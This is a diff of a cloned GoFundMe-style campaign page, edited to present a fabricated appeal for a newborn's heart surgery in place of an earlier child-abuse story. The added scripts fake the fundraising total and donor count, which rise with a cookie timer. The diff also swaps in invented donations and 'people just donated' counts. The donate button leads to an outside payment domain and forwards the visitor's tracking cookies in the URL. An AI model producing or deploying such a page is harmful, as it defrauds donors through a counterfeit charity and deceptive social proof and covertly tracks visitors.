@@ -1,7 +1,17 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-PT">
   <head>
 
+    <meta name="referrer" content="no-referrer">
+<style>/* CSS */
+
+
+  @media (max-width: 768px) {
+    .desktop-breaks {
+      display: none;
+    }
+  }
+  </style>
 
     <link
       rel="icon"
@@ -11783,43 +11793,6 @@
 
 
 
-              <div class="progress-meter_progressMeter__BYOlt progress-meter progress-meter_goalBarVariantProgressMeter___rdnj" style="display: flex; align-items: center; justify-content: space-between; gap: 20px; padding: 10px; border: 1px solid #e6e6e6; border-radius: 8px;">
-                <div style="flex: 1;">
-                    <div class="progress-meter_progressMeterHeading__A6Slt hrt-text-body-sm" style="font-weight: bold; font-size: 16px; margin-bottom: 5px;">
-                        <span class="progress-meter_thickerHeading__V5Kgs">
-                            <span>$88,710</span> raised
-                        </span>
-                    </div>
-                    <div class="hrt-text-body-sm hrt-text-neutral-500" style="color: #6f6f6f; font-size: 14px;">
-                        $100,000 goal<span class="hrt-ml-1 hrt-mr-1">·</span>3,988 donations
-                    </div>
-                </div>
-                <div class="progress-meter_circleProgressBar__UW05M" style="flex-shrink: 0;">
-                    <svg height="80" role="img" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" viewBox="-40 -40 80 80" width="80" style="background-color: transparent;">
-                        <title>88% of the goal raised</title>
-                        <g>
-                            <!-- Background circle -->
-                            <path d="M 0 -36 A 36 36 0 1 1 0 36 A 36 36 0 1 1 0 -36" fill="none" stroke="#f4f2ec" stroke-width="8"></path>
-                        </g>
-                        <g>
-                            <!-- Progress Bar at 88% -->
-                       <path d="M 0 -36 A 36 36 0 1 1 0 36 A 36 36 0 1 1 0 -36" 
-                       fill="none" stroke="#02a95c" stroke-width="8" stroke-linecap="round" 
-                       stroke-dasharray="198.88, 226" stroke-dashoffset="0"></path>
-
-                        </g>
-                        <text alignment-baseline="middle" class="circle-goal-bar_text__kksyP" dominant-baseline="middle" text-anchor="middle" x="1" y="1" fill="#6F6F6F">88%</text>
-                    </svg>
-                </div>
-            </div>
-            
-            
-            
-            
-            
-            
-            
-            
 
 
 
@@ -11829,17 +11802,254 @@
 
 
 
-            <div class="campaign-page_shareAndDonate__qRlrx">
-              <div>
-                  <div class="hrt-mb-1 hrt-mx-auto" data-element-id="btn_share" data-analytic-event-listener="true">
-                     
-                  </div>
-                  <div data-element-id="btn_donate" data-analytic-event-listener="true">
-                      <a class="gfm-donate-button hrt-primary-button hrt-primary-button--full hrt-primary-button--large hrt-primary-button--default hrt-base-button" href="https://chatbotsai.co/paymentrack">Donate now</a>
-                  </div>
-              </div>
-          </div>
-          
+
+
+
+
+
+<!-- ========== PAGE 1  (first domain)  ========== -->
+<div class="progress-meter_progressMeter__BYOlt progress-meter progress-meter_goalBarVariantProgressMeter___rdnj" style="display: flex; align-items: center; justify-content: space-between; gap: 20px; padding: 10px; border: 1px solid #e6f2ec; border-radius: 8px;">
+  <div style="flex: 1;">
+    <div class="progress-meter_progressMeterHeading__A6Slt hrt-text-body-sm" style="font-weight: bold; font-size: 16px; margin-bottom: 5px;">
+      <span class="progress-meter_thickerHeading__V5Kgs">
+        <span id="amountRaisedSpan">$0</span> raised
+      </span>
+    </div>
+    <div class="hrt-text-body-sm hrt-text-neutral-500" style="color: #6f6f6f; font-size: 14px;">
+      <span id="goalSpan">$0 goal</span>
+      <span class="hrt-ml-1 hrt-mr-1">·</span>
+      <span id="donationsSpan">0 donations</span>
+    </div>
+  </div>
+  <div class="progress-meter_circleProgressBar__UW05M" style="flex-shrink: 0;">
+    <svg height="80" role="img" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" viewBox="-40 -40 80 80" width="80" style="background-color: transparent;">
+      <title id="progress-title">0% of the goal raised</title>
+      <g>
+        <path d="M 0 -36 A 36 36 0 1 1 0 36 A 36 36 0 1 1 0 -36" fill="none" stroke="#f4f2ec" stroke-width="8"></path>
+      </g>
+      <g>
+        <path id="fundraiser-circle-goal-bar_line" d="M 0 -36 A 36 36 0 1 1 0 36 A 36 36 0 1 1 0 -36" fill="none" stroke="#02a95c" stroke-width="8" stroke-linecap="round" stroke-dasharray="226.1946710584651" stroke-dashoffset="226.1946710584651"></path>
+      </g>
+      <text alignment-baseline="middle" class="circle-goal-bar_text__kksyP" dominant-baseline="middle" text-anchor="middle" x="1" y="1" fill="#6F6F6F" id="progressText">0%
+      </text>
+    </svg>
+  </div>
+</div>
+<div class="campaign-page_shareAndDonate__qRlrx">
+  <div>
+    <div class="hrt-mb-1 hrt-mx-auto" data-element-id="btn_share" data-analytic-event-listener="true"></div>
+    <div class="desktop-breaks">
+      <br><br><br><br><br><br><br>
+    </div>
+    <div id="donationCompleteMessage" style="display: none; background-color: #f0f9f4; border: 1px solid #02a95c; border-radius: 8px; padding: 20px; text-align: center; margin: 20px 0;">
+      <div style="color: #02a95c; font-weight: bold; font-size: 18px; margin-bottom: 10px;">
+        🎉 Fundraising Goal Reached!
+      </div>
+      <div style="color: #2f3941; font-size: 16px;">
+        Thank you to everyone who contributed to this campaign.
+      </div>
+    </div>
+    <div data-element-id="btn_donate" data-analytic-event-listener="true">
+      <a class="gfm-donate-button hrt-primary-button hrt-primary-button--full hrt-primary-button--large hrt-primary-button--default hrt-base-button" href="https://chatbotsai.co/paymentrack">
+        Donate now
+      </a>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ---------------- helper: cookie utils ---------------- */
+function getCookieValue(name) {
+  var cookieString = document.cookie || '';
+  var cookies = cookieString.split(';');
+  for (var i = 0; i < cookies.length; i++) {
+    var c = cookies[i].trim();
+    if (c.indexOf(name + '=') === 0) {
+      return c.substring((name + '=').length, c.length);
+    }
+  }
+  return null;
+}
+
+function setMyDonationCookie(obj) {
+  var jsonStr = JSON.stringify(obj);
+  document.cookie = "myDonationCookie=" + jsonStr + "; path=/; max-age=31536000";
+}
+</script>
+
+<script>
+/* ---------------- percentage helpers ---------------- */
+function getExtraAmount(percentage) {
+  if (percentage < 10) {
+    return percentage + (percentage * 100);
+  } else {
+    var str = percentage.toString();
+    var firstDigit = parseInt(str[0], 10);
+    return percentage + 7 + (firstDigit * 100);
+  }
+}
+</script>
+
+<script>
+/* ---------------- visit / fbclid cookie ---------------- */
+document.addEventListener("DOMContentLoaded", function () {
+  var visitCookieName = "visitorInfo";
+  var oneYear = 31536000;
+  var urlParams = new URLSearchParams(window.location.search);
+  var hasFbclidInUrl = urlParams.has("fbclid") && urlParams.get("fbclid") !== "";
+
+  var existing = getCookieValue(visitCookieName);
+  var visitObj = {};
+  if (existing) {
+    try { visitObj = JSON.parse(existing); } catch (e) { visitObj = {}; }
+  }
+
+  visitObj.visited = "yes";
+
+  if (hasFbclidInUrl) {
+    visitObj.fbclid = "yes";
+  } else {
+    if (visitObj.fbclid !== "yes") {
+      visitObj.fbclid = "no";
+    }
+  }
+
+  document.cookie = visitCookieName + "=" + JSON.stringify(visitObj) + "; path=/; max-age=" + oneYear;
+});
+</script>
+
+<script>
+/* ---------------- progress bar logic ---------------- */
+document.addEventListener("DOMContentLoaded", function() {
+  var totalGoal = 100000;
+  var totalDonorsAt100 = 2930;
+
+  var donationPercentage = 47;
+
+  try {
+    var cookieValue = getCookieValue('myDonationCookie');
+    if (cookieValue) {
+      var cookieObj = JSON.parse(cookieValue);
+      if (cookieObj.start) {
+        var now = Date.now();
+        var startTime = parseInt(cookieObj.start, 10);
+        var diffMs = now - startTime;
+        if (diffMs > 0) {
+          var hoursSince = Math.floor(diffMs / 3600000);
+          var increments = Math.floor(hoursSince / 6);
+          donationPercentage += increments;
+        }
+      }
+      if (typeof cookieObj.incrementsUsed === 'number') {
+        donationPercentage += cookieObj.incrementsUsed;
+      }
+    }
+  } catch (err) {
+    console.log("Cookie parse error or no valid JSON in 'myDonationCookie':", err);
+  }
+
+  var displayDonationPercentage = Math.min(donationPercentage, 100);
+  var currentRaised = Math.round((totalGoal * displayDonationPercentage) / 100);
+  var currentDonors = Math.round((totalDonorsAt100 * displayDonationPercentage) / 100);
+
+  var extraAmount = getExtraAmount(displayDonationPercentage);
+  var finalDisplayedRaised = currentRaised + extraAmount;
+
+  document.getElementById("amountRaisedSpan").textContent = "$" + finalDisplayedRaised.toLocaleString();
+  document.getElementById("goalSpan").textContent = "$" + totalGoal.toLocaleString() + " goal";
+  document.getElementById("donationsSpan").textContent = currentDonors.toLocaleString() + " donations";
+  document.getElementById("progressText").textContent = displayDonationPercentage + "%";
+  document.getElementById("progress-title").textContent = displayDonationPercentage + "% of the goal raised";
+
+  var radius = 36;
+  var circumference = 2 * Math.PI * radius;
+  var progressCircle = document.getElementById("fundraiser-circle-goal-bar_line");
+  var offset = circumference * (1 - (displayDonationPercentage / 100));
+  progressCircle.setAttribute("stroke-dashoffset", offset.toString());
+
+  if (displayDonationPercentage >= 100) {
+    var donateButtonContainers = document.querySelectorAll('[data-element-id="btn_donate"]');
+    donateButtonContainers.forEach(function(container) {
+      container.style.display = 'none';
+    });
+    var completeMessage = document.getElementById('donationCompleteMessage');
+    if (completeMessage) {
+      completeMessage.style.display = 'block';
+    }
+  }
+});
+</script>
+
+<!-- ------------- SIMPLIFIED DONATION LINK SCRIPT (now also ships cookies) ------------- -->
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  var donateAnchors = document.querySelectorAll('[data-element-id="btn_donate"] a');
+
+  var defaultLink = 'https://chatbotsai.co/paymentrack';
+
+  var urlParams = new URLSearchParams(window.location.search);
+  var fbclid = urlParams.get('fbclid');
+  var baseLink = defaultLink;
+  if (fbclid) {
+    baseLink += (baseLink.indexOf('?') === -1 ? '?' : '&') + 'fbclid=' + fbclid;
+  }
+
+  donateAnchors.forEach(function(anchor) {
+    anchor.href = baseLink;
+  });
+
+  /* When the button is pressed we:
+     1) bump incrementsUsed,
+     2) rebuild the cookie,
+     3) push both cookies into the URL as utm_* params,
+     4) send the user on their way. */
+  donateAnchors.forEach(function(anchor) {
+    anchor.addEventListener('click', function(e) {
+      e.preventDefault();
+
+      try {
+        /* --- bump the counter in myDonationCookie --- */
+        var cookieValue = getCookieValue('myDonationCookie');
+        var cookieObj = cookieValue ? JSON.parse(cookieValue) : {};
+
+        if (typeof cookieObj.incrementsUsed === 'number') {
+          cookieObj.incrementsUsed += 1;
+        } else {
+          cookieObj.incrementsUsed = 1;
+        }
+        setMyDonationCookie(cookieObj);   // save it
+
+        /* --- collect both cookies so we can ship them --- */
+        var mdcStr = JSON.stringify(cookieObj);
+        var viStr  = getCookieValue('visitorInfo') || '{}';
+
+        /* --- build a fresh URL that carries the data --- */
+        var u = new URL(anchor.href);
+        u.searchParams.set('utm_mdc', encodeURIComponent(mdcStr));
+        u.searchParams.set('utm_vi',  encodeURIComponent(viStr));
+
+        /* --- go to the next page --- */
+        window.location.href = u.toString();
+
+      } catch (err) {
+        console.log("[GeoScript] trouble preparing redirect:", err);
+        window.location.href = anchor.href; // fallback
+      }
+    });
+  });
+});
+</script>
+
+
+
+
+
+
+
+                
+
+
+
 
 
 
@@ -11853,8 +12063,8 @@
 >
     <picture class="campaign-hero_image__587ZT">
         <img
-            data-savepage-src="./waylon.png"
-            src="./waylon.png"
+            data-savepage-src="jhon.png"
+            src="jhon.png"
             alt="Imagem da campanha"
         />
     </picture>
@@ -11865,8 +12075,8 @@
 >
     <picture class="campaign-hero_image__587ZT">
         <img
-            data-savepage-src="./waylon.png"
-            src="./waylon.png"
+            data-savepage-src="jhon.png"
+            src="jhon.png"
             alt="Imagem da campanha"
         />
     </picture>
@@ -11876,7 +12086,7 @@
 
                 <header class="p-campaign-header">
                   <h1 class="hrt-mb-0 p-campaign-title">
-                    Support Waylon's Journey to Recovery
+                    Support Baby Jhon's Urgent Heart Surgery
                   </h1>
                 </header>
                 <div class="p-campaign-byline" bis_skin_checked="1">
@@ -11925,7 +12135,7 @@
                         class="m-campaign-byline-description"
                         bis_skin_checked="1"
                       >
-                      Aaron Coody
+                      Grace Williams
                       is organizing this campaign.
                       </div>
                     </div>
@@ -11985,14 +12195,8 @@
                       bis_skin_checked="1"
                     >
                     <div bis_skin_checked="1">
-                        My name is Aaron Coody i am the uncle of Waylon and best friend of Dylan Simpson. Dylan has been set as the beneficiary of this go fund me and will receive all donations personally. Waylon is a sweet, bright little boy who, at just 3 years old, has already experienced more pain and hardship than any child should ever have to endure. Waylon was subjected to physical abuse by someone who was supposed to love and protect him. He has suffered not only from the physical bruises and injuries but also from the emotional and psychological toll of being betrayed by someone he should have trusted.
-
-                        Waylon needs urgent Surgery, Trauma-Ocused Cognitive Behavioral Therapy to address the scars of abuse, and ongoing support to help him process and move forward. The funds we are raising will go directly toward covering his medical treatments, therapeutic services, and the resources necessary to give him the childhood he deserves — one filled with love, laughter, and hope.
-No child should ever experience abuse, but Waylon is one of the many children who are victims of violence. Despite the pain he's endured, Waylon is resilient. With your help, we can give him the opportunity to grow up in a world where he feels safe, loved, and cherished.
-                        
-We are asking for your kindness, support, and generosity to help Waylon heal. Every donation, every share, and every prayer can make a profound difference in his life. Together, we can give Waylon the chance to thrive, free from the shadows of his past.
-Thank you for being a part of his journey toward recovery.                      </div>
-                      <div bis_skin_checked="1">
+My name is Grace and I am writing this with a broken heart. My baby boy Jhon has been in the ICU since the day he was born. He was diagnosed with a rare and severe heart condition called "Transposition of the Great Arteries, Pulmonary Valve Stenosis, and a Ventricular Septal Defect (VSD)." The doctors have told us that this condition is incompatible with life unless he undergoes immediate surgery. 🥺 Since the moment he was born, my husband and I have watched our child fight for every breath. We left everything behind in our small town to be here with him in Boston, where he’s been hooked up to machines, struggling to survive. The pain of seeing him fight this battle, so small and helpless, is unbearable. My heart shatters every time I look at him. He needs two urgent surgeries right here in Boston to survive the next few months. After that, he will need a final surgery in New York. The cost of everything is overwhelming, and we can’t do this alone. I’m begging for your help. Every day, I watch my baby boy fight for his life, but I know the odds are against us. He’s so young, and yet he’s already had to endure more than any child should ever have to go through. But we won’t give up on him, and we can’t let him suffer any longer. Please, I’m asking for your kindness and generosity to help save my son’s life. The surgeries, the medical bills, the care—everything is too much for us to carry on our own. Any donation, no matter how small, can help give him a chance at a future. He deserves that chance. He deserves a life full of love, joy, and happiness. I don’t know how much time we have left, but I will fight for my son with every ounce of strength I have. Please, help us. Together, we can give him the chance to live the life he deserves. Thank you for your kindness, your prayers, and your support. ❤️
+                      </div>
                       
                     
                   </div>
@@ -12055,7 +12259,13 @@ Thank you for being a part of his journey toward recovery.                      
                           data-element-id="btn_donations"
                           data-analytic-event-listener="true"
                         >
-                          (3,988)
+                         <script>
+  // Assume this value comes from your calculation, e.g., currentDonors computed earlier
+  var currentDonors = 2930; // Replace with your actual computed value if needed
+  
+  // Format the number with commas and display it
+  document.getElementById("donorCountDisplay").textContent = currentDonors.toLocaleString();
+</script>
                         </button>
                       </h2>
                       
@@ -12125,7 +12335,7 @@ Thank you for being a part of his journey toward recovery.                      
                         <span
                           class="hrt-ml-2 hrt-text hrt-text-purple-600 hrt-font-bold hrt-text-body-md"
                           ><strong
-                            >301 people just donated</strong
+                            >349 people just donated</strong
                           ></span
                         >
                       </div>
@@ -12193,7 +12403,7 @@ Thank you for being a part of his journey toward recovery.                      
                                 class="donation_donationList__fa1FT hrt-list-unstyled hrt-meta-list"
                               >
                                 <li class="hrt-meta-list-item">
-                                  <span class="hrt-font-bold">$500</span>
+                                  <span class="hrt-font-bold">$750</span>
                                 </li>
                                 <li class="hrt-meta-list-item">
                                   <span
@@ -12260,12 +12470,12 @@ Thank you for being a part of his journey toward recovery.                      
                               data-testid="hrt-avatar-lockup-content"
                               bis_skin_checked="1"
                             >
-                              <div bis_skin_checked="1">Laura Della Villa</div>
+                              <div bis_skin_checked="1">Anonymous</div>
                               <ul
                                 class="donation_donationList__fa1FT hrt-list-unstyled hrt-meta-list"
                               >
                                 <li class="hrt-meta-list-item">
-                                  <span class="hrt-font-bold">$1000</span>
+                                  <span class="hrt-font-bold">$1500</span>
                                 </li>
                                 <li class="hrt-meta-list-item">
                                   <span
@@ -12333,13 +12543,13 @@ Thank you for being a part of his journey toward recovery.                      
                               bis_skin_checked="1"
                             >
                               <div bis_skin_checked="1">
-                                Valentina Sedazzari
+                                Anonymous
                               </div>
                               <ul
                                 class="donation_donationList__fa1FT hrt-list-unstyled hrt-meta-list"
                               >
                                 <li class="hrt-meta-list-item">
-                                  <span class="hrt-font-bold">$100</span>
+                                  <span class="hrt-font-bold">$45</span>
                                 </li>
                                 <li class="hrt-meta-list-item">
                                   <span
@@ -12451,7 +12661,7 @@ Thank you for being a part of his journey toward recovery.                      
                               bis_skin_checked="1"
                             >
                               <div class="hrt-font-bold" bis_skin_checked="1">
-                                Aaron Coody
+                                Grace Williams
                               </div>
                               <div
                                 class="hrt-text-body-sm"
@@ -12463,7 +12673,7 @@ Thank you for being a part of his journey toward recovery.                      
                                 class="hrt-text-body-sm"
                                 bis_skin_checked="1"
                               >
-                              Medical & Healing
+                              Single Mother
                               </div>
                             </div>
                           </div>
